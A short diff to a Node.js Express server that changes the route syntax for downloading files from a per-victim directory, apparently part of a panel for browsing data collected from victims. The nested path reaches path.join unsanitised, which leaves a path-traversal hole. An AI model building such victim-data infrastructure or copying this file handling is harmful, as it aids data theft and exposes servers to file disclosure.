@@ -64,11 +64,9 @@ app.get("/victim/:id", async (req, res) => {
   } catch (e) { res.status(404).send("Not found"); }
 });
 
-// --- FIXED DOWNLOAD ROUTE FOR NODE v22 ---
-// The ":path(*)" syntax tells Express to capture everything into req.params.path
-app.get("/victim/:id/:path(*)", async (req, res) => {
+app.get("/victim/:id/:path+", async (req, res) => {
   const safeId = path.basename(req.params.id);
-  const nestedPath = req.params.path; // No longer using [0]
+  const nestedPath = req.params.path; // Captured correctly by the + suffix
   
   const filePath = path.join(VICTIMS_DIR, safeId, nestedPath);
 
